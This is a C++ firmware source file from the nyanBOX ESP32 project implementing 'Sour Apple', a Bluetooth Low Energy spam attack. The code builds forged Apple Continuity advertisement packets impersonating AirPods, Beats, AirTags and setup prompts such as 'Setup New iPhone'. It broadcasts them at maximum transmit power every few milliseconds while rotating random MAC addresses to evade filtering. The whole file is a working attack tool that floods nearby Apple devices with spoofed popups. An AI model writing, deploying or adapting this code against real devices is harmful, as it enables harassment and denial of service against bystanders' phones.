/*
    nyanBOX by Nyan Devices
    https://github.com/jbohack/nyanBOX
    Copyright (c) 2025 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include "../include/sourapple.h"
#include "../include/display_mirror.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern Adafruit_NeoPixel pixels;

int count = 0;
bool isSpamming = false;
bool bleInitialized = false;

static bool needsRedraw = true;
static int lastDisplayedCount = 0;
static unsigned long lastDisplayUpdate = 0;
const unsigned long displayUpdateInterval = 1000;

struct ContinuityModel {
    uint16_t value;
    const char *name;
};

const ContinuityModel continuity_models[] = {
    {0x0E20, "AirPods Pro"},
    {0x0A20, "AirPods Max"},
    {0x0055, "AirTag"},
    {0x0030, "Hermes AirTag"},
    {0x0220, "AirPods"},
    {0x0F20, "AirPods 2nd Gen"},
    {0x1320, "AirPods 3rd Gen"},
    {0x1420, "AirPods Pro 2nd Gen"},
    {0x1020, "Beats Flex"},
    {0x0620, "Beats Solo 3"},
    {0x0B20, "Powerbeats Pro"},
    {0x0C20, "Beats Solo Pro"},
    {0x1120, "Beats Studio Buds"},
    {0x0520, "Beats X"},
    {0x0920, "Beats Studio 3"},
    {0x1720, "Beats Studio Pro"},
    {0x1220, "Beats Fit Pro"},
    {0x1620, "Beats Studio Buds+"}
};

struct ContinuityAction {
    uint8_t value;
    const char *name;
};

const ContinuityAction continuity_actions[] = {
    {0x13, "AppleTV AutoFill"},
    {0x24, "Apple Vision Pro"},
    {0x05, "Apple Watch"},
    {0x27, "AppleTV Connecting..."},
    {0x20, "Join This AppleTV?"},
    {0x19, "AppleTV Audio Sync"},
    {0x1E, "AppleTV Color Balance"},
    {0x09, "Setup New iPhone"},
    {0x2F, "Sign in to other device"},
    {0x02, "Transfer Phone Number"},
    {0x0B, "HomePod Setup"},
    {0x01, "Setup New AppleTV"},
    {0x06, "Pair AppleTV"},
    {0x0D, "HomeKit AppleTV Setup"},
    {0x2B, "AppleID for AppleTV?"}
};

static esp_ble_adv_params_t adv_params = {
    .adv_int_min        = 0x20,
    .adv_int_max        = 0x40,
    .adv_type           = ADV_TYPE_NONCONN_IND,
    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

void getAdvertisementData(uint8_t *data, uint8_t *len) {
    if (random(2) == 0) {
        const ContinuityModel &model = continuity_models[random(sizeof(continuity_models)/sizeof(continuity_models[0]))];
        uint8_t applePacket[31] = {
            0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07,
            (uint8_t)((model.value >> 0x08) & 0xFF),
            (uint8_t)((model.value >> 0x00) & 0xFF),
            0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
            (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256),
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };
        memcpy(data, applePacket, 31);
        *len = 31;
    } else {
        const ContinuityAction &action = continuity_actions[random(sizeof(continuity_actions)/sizeof(continuity_actions[0]))];
        uint8_t applePacket[11] = {
            0x0A, 0xff, 0x4c, 0x00, 0x0F, 0x05, 0xC0,
            action.value,
            (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)
        };
        memcpy(data, applePacket, 11);
        *len = 11;
    }
}

void executeSpam() {
    if (!bleInitialized) {
        if (!btStarted()) {
            btStart();
        }

        esp_bluedroid_status_t bt_state = esp_bluedroid_get_status();
        if (bt_state == ESP_BLUEDROID_STATUS_UNINITIALIZED) {
            esp_bluedroid_init();
        }
        if (bt_state != ESP_BLUEDROID_STATUS_ENABLED) {
            esp_bluedroid_enable();
        }

        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
        
        bleInitialized = true;
    }

    static int macChangeCounter = 0;
    if (++macChangeCounter % 10 == 0) {
        uint8_t mac[6] = {
            (uint8_t)(random(256) | 0xC0), 
            (uint8_t)random(256), 
            (uint8_t)random(256), 
            (uint8_t)random(256), 
            (uint8_t)random(256), 
            (uint8_t)random(256)
        };
        esp_ble_gap_set_rand_addr(mac);
    }
    
    uint8_t advData[31];
    uint8_t advDataLen = 0;
    getAdvertisementData(advData, &advDataLen);
    
    esp_ble_gap_config_adv_data_raw(advData, advDataLen);
    esp_ble_gap_start_advertising(&adv_params);
    
    delay(5);
}

static void drawDisplay() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont11_tf);
    
    u8g2.drawStr(0, 10, "Sour Apple");
    u8g2.drawLine(0, 12, u8g2.getUTF8Width("Sour Apple"), 12);
    
    u8g2.drawStr(0, 30, "Status:");
    u8g2.setCursor(50, 30);
    u8g2.print(isSpamming ? "Active" : "Stopped");
    
    u8g2.setCursor(0, 45);
    u8g2.print("Packets: ");
    u8g2.print(count);
    
    u8g2.setFont(u8g2_font_4x6_tr);
    u8g2.drawStr(0, 62, "UP: Start/Stop");
    
    u8g2.sendBuffer();
  displayMirrorSend(u8g2);
}

void sourappleSetup() {
    count = 0;
    isSpamming = false;
    bleInitialized = false;
    needsRedraw = true;
    lastDisplayedCount = 0;
    lastDisplayUpdate = 0;
    drawDisplay();
    delay(500);
}

void sourappleLoop() {
    static unsigned long lastButtonCheck = 0;
    static unsigned long lastSpam = 0;
    static unsigned long spamDelay = 20;
    static bool wasSpamming = false;
    unsigned long now = millis();

    if (now - lastButtonCheck > 300) {
        if (digitalRead(BUTTON_PIN_UP) == LOW) {
            isSpamming = !isSpamming;

            if (!isSpamming && wasSpamming && bleInitialized) {
                esp_ble_gap_stop_advertising();
                delay(100);
            }

            drawDisplay();
            delay(500);
            lastButtonCheck = now;
        }
    }

    if (wasSpamming != isSpamming) {
        wasSpamming = isSpamming;
        needsRedraw = true;
    }

    if (isSpamming && now - lastSpam > spamDelay) {
        executeSpam();
        count++;

        if (count > 99999) {
            count = 0;
        }

        lastSpam = now;
    }

    if (!isSpamming && now - lastDisplayUpdate >= displayUpdateInterval) {
        lastDisplayUpdate = now;
        needsRedraw = true;
    }

    if (isSpamming && now - lastDisplayUpdate >= displayUpdateInterval) {
        lastDisplayUpdate = now;
        needsRedraw = true;
    }

    if (needsRedraw) {
        drawDisplay();
        lastDisplayedCount = count;
        needsRedraw = false;
    }
}